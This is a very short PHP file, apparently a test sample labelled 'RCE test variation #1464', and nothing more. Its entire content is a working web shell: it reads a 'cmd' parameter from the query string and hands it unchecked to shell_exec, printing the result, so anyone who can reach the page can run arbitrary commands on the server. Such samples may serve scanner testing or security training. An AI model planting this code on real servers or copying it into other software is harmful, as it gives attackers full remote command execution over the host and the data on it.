<?php
// RCE test variation #1464
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>